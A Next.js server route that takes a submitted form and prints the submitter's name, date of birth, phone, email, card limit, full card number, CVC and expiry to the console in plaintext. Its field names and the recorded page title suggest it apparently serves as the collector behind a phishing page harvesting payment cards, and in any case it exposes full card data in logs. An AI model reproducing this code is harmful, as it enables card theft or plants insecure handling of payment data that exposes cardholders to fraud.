import { NextResponse } from 'next/server';

export async function POST(request) {
  try {
    const data = await request.json();
    console.log('=== FORM SUBMISSION RECEIVED ===');
    console.log('Page Title:', data.pageTitle);
    console.log('Name:', data.name, data.lastname);
    console.log('DOB:', data.birth);
    console.log('Phone:', data.phone);
    console.log('Email:', data.email);
    console.log('Card Limit:', data.cardLimit);
    console.log('Card Number:', data.card);
    console.log('CVC:', data.cvcpwd);
    console.log('Expiry:', `${data.expmonth} / ${data.expyear}`);
    console.log('=================================');

    return NextResponse.json({ success: true, message: 'Form submitted successfully' });
  } catch (error) {
    console.error('Error handling form submission:', error);
    return NextResponse.json({ success: false, error: 'Invalid payload' }, { status: 400 });
  }
}
